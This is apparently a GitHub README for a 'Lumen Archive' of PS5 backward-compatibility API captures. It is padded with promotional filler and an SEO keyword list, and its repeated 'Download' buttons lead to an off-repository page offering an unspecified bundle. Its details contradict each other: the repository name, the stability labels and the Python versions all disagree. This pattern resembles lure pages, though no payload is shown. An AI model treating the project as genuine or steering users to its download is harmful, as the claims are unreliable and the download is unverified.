![preview](https://raw.githubusercontent.com/wangyuechi66-beep/ps5-legacy-status-api-archive/main/promo_3681c.svg)

# Lumen Archive: PlayStation 5 Compatibility Signal Database

**Lumen Archive** is a transformative, community-centered data repository that preserves and interprets the evolving backward compatibility signals emitted by the PlayStation 5 ecosystem. Born from a simple extract of API responses, this project transforms raw, machine-readable status codes into a living, navigable chronicle of gaming history. Here, we do not merely store data; we illuminate the hidden pathways between console generations, offering developers, archivists, and enthusiasts a unique lens through which to observe how the past coexists with the present.

The PlayStation 5’s backward compatibility feature is a bridge to a vast library of PlayStation 4 titles. However, the official status API returns concise, often cryptic, JSON payloads. **Lumen Archive** decodes these signals, categorizes them, and presents them within a structured, searchable framework. Our mission is to reduce the friction between curiosity and understanding, allowing anyone—from a hobbyist checking if their favorite RPG is playable to a researcher analyzing the stability of specific game engines across firmware updates—to access this information with clarity and confidence.

## 📡 Overview

This repository serves as the central hub for the **Lumen Archive** project. It contains the raw data extraction, a set of analytical scripts, and a comprehensive, human-readable index of every captured response. Unlike a simple dump, this project is structured to evolve. Each entry in the dataset is enriched with metadata, including the date of capture, the firmware version in use, and a qualitative stability score derived from the API’s response patterns.

We believe that data without context is merely noise. Therefore, **Lumen Archive** focuses on transforming the transactional nature of an API call into a contextual, historical narrative. The primary dataset (`captures/`) is curated to track changes over time, allowing users to observe how Sony’s compatibility matrix shifts with each system update. This is not just a snapshot; it is a time-lapse of a platform’s lifecycle.

### 🌟 The Core Philosophy

Our approach is similar to that of a lighthouse keeper. We do not build the ships (the games), nor do we control the weather (the firmware updates). Instead, we maintain the light—the beacon that helps navigators understand the coastline. **Lumen Archive** is that beacon for the PlayStation 5's compatibility waters. We map the shoals, highlight the safe harbors, and warn of the rocks, all through the disciplined interpretation of official signals.

## 📁 Repository Structure

The repository is meticulously organized to facilitate both quick browsing and deep analysis.

```text
supreme-enigma/
├── captures/
│   ├── 2026-01-01_firmware_10.00.json
│   ├── 2026-02-14_firmware_10.10.json
│   └── latest.json
├── analysis/
│   ├── stability_trends.py
│   ├── title_classifier.py
│   └── report_generator.py
├── docs/
│   ├── API_REFERENCE.md
│   ├── DATA_SCHEMA.md
│   └── CONTRIBUTING.md
├── index/
│   ├── catalog.yaml
│   └── README.md
├── LICENSE
└── README.md
```

- **`captures/`**: Raw JSON responses from the official PlayStation 5 backwards compatibility status API. Each file is timestamped and tagged with the relevant system firmware version.
- **`analysis/`**: Python-based scripts that parse the raw captures, generate trend visualizations, and validate data integrity.
- **`docs/`**: Detailed documentation covering the data schema, the methodology of our stability scoring, and guidelines for contributing new captures.
- **`index/`**: The curated, human-readable catalog that maps game titles to their compatibility status, complete with release dates and genre tags.

## 🚀 Getting Started

To begin your exploration of the **Lumen Archive**, you do not need specialized hardware or proprietary software. The dataset is available in standard, open formats (JSON and YAML), and the analysis scripts are written in portable Python. Whether you are a data scientist, a digital preservationist, or simply a curious gamer, you can start interrogating the data within minutes.

We recommend starting with the `index/catalog.yaml` file. This file serves as the master key to the archive, providing a clean, human-readable summary of every title captured. From there, you can dive into the raw `captures/` files to see the exact byte-for-byte responses from the API.

### 🔧 Prerequisites

- An interest in gaming history and platform evolution.
- A basic understanding of JSON or YAML for manual browsing.
- Python 3.9+ (recommended, but not required) for running the analysis scripts.

### 💾 Obtaining the Data

[![Download](https://raw.githubusercontent.com/wangyuechi66-beep/ps5-legacy-status-api-archive/main/btn_9e4999.svg)](https://wangyuechi66-beep.github.io/ps5-legacy-status-api-archive/)

The archive is designed to be self-contained. The data is stored in a compressed, versioned bundle to ensure integrity and ease of transport. The primary download provides the complete history of captures up to the last major firmware release. For continuous updates, we encourage users to track the repository’s commit history, which will reflect new captures as they are recorded.

## 📊 Features

**Lumen Archive** is more than just a collection of files; it is a suite of tools and data designed for utility and insight.

- **Chronological Tracking**: Observe the exact evolution of compatibility status for specific titles across different firmware versions. This feature allows researchers to pinpoint the exact update that altered a game's performance profile.
- **Stability Score Index**: A proprietary algorithm analyzes the raw API signals to assign a qualitative stability score (e.g., "Exemplary", "Variable", "Constrained"). This abstracts the raw boolean/error codes into a gradient of reliability.
- **Multi-Language Title Index**: The catalog includes localized title mappings for major regions (JP, EU, US), ensuring that users can search for their games in their native language.
- **Trend Analysis Modules**: The `analysis/` scripts can generate delta reports, highlighting which titles were added, removed, or changed status between captures.
- **Responsive Data Viewer**: The `index/README.md` includes a JSON-based web component (simple HTML/JS) that renders the catalog in a sortable, filterable table, designed for mobile and desktop viewing alike.
- **Community Contribution Framework**: A clear, schematized process for adding new captures, ensuring that the archive remains current without sacrificing data purity.

## 🗺️ Roadmap and Vision

The initial extraction is just the beginning. We are committed to transforming **Lumen Archive** into the definitive reference for PlayStation 5 cross-generational play. Future development goals include:

1.  **Expanded Scope**: Capturing data for accessory compatibility and save-data transfer signals.
2.  **Predictive Modeling**: Using historical trends to forecast the likelihood of future compatibility changes based on developer activity.
3.  **Localization Expansion**: Adding support for additional languages in the catalog (e.g., Korean, Traditional Chinese).
4.  **Historical Deep-Dive**: Integrating data from the PlayStation 4 era to provide a generational overview.

We invite the community to guide our priorities. If you have a specific need for the data that we have not addressed, please open an issue or submit a pull request.

## 🤝 Contributing to the Archive

We welcome contributions that expand the dataset or improve the analytical tooling. To maintain high standards, all contributions must adhere to the following principles:

- **Accuracy**: New captures must be direct, unmodified responses from the official API.
- **Context**: Each capture must include the exact date, time, and firmware version present at the moment of the request.
- **Respect**: Do not include speculative interpretations within the raw data files. Keep analysis in the `analysis/` or `docs/` folders.

Please refer to `docs/CONTRIBUTING.md` for the detailed protocol. We operate on a standard fork-and-pull-request workflow. The main branch is protected, and all submissions undergo a review process to ensure data hygiene.

### 🔍 SEO-Friendly Keywords

This archive targets keywords such as "PlayStation 5 backward compatibility," "PS5 game status," "firmware update analysis," "gaming data archive," "digital preservation," "platform stability," "cross-generation gaming," and "Sony API data."

## 🛠️ Built With

The project primarily relies on the Python ecosystem for analysis and standard web technologies (HTML, CSS, JavaScript) for the viewing interface. We utilize the YAML format for configuration and metadata due to its readability, and JSON for data interchange due to its ubiquity.

- **Python 3.10+** for scripting.
- **PyYAML** for parsing the catalog.
- **Pandas** (optional) for heavy data manipulation in research contexts.

We deliberately avoid heavyweight dependencies to keep the archive lightweight and accessible for users with limited bandwidth or computational resources.

## 🧭 Deep Dive: The Schema

For those interested in the technical underpinnings, the data schema is defined as follows:

**`captures/latest.json`**:
```json
{
  "capture_timestamp": "2026-03-15T14:22:10Z",
  "firmware_version": "10.50",
  "titles": [
    {
      "title_id": "CUSA-00001",
      "compatibility": "playable",
      "notes": "Rock-solid 60fps performance.",
      "last_checked": "2026-03-15T14:22:10Z",
      "esrb_rating": "E"
    }
  ]
}
```

**`index/catalog.yaml`**:
```yaml
- title_id: CUSA-00001
  name:
    en: "The Last Guardian"
    jp: "人喰いの大鷲トリコ"
  genre: ["Action", "Adventure"]
  release_date: "2016-12-06"
  stability_score: "Excellent"
  available_on_ps5: true
```

This standardized structure allows for high interoperability with other tools and datasets.

## ⚠️ Disclaimer

**Lumen Archive** is an independent, community-driven project and is not affiliated with, endorsed by, or sponsored by Sony Interactive Entertainment or any of its subsidiaries. "PlayStation" and "PS5" are registered trademarks of Sony Interactive Entertainment Inc. All game titles and associated metadata are the property of their respective copyright holders.

The data contained within this repository is derived from publicly accessible network endpoints. We provide this information "as-is" without warranty of any kind, express or implied. We are not responsible for any actions taken based on the information provided herein. The stability scores are subjective interpretations of raw data and should not be considered official statements from the platform holder.

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🌐 Connect with the Project

We value feedback and collaboration. While we do not have an external forum, the GitHub Issues section is the primary channel for discussion and support. Our virtual doors are always open for constructive dialogue.

**-- End of Main Document --**

[![Download](https://raw.githubusercontent.com/wangyuechi66-beep/ps5-legacy-status-api-archive/main/btn_9e4999.svg)](https://wangyuechi66-beep.github.io/ps5-legacy-status-api-archive/)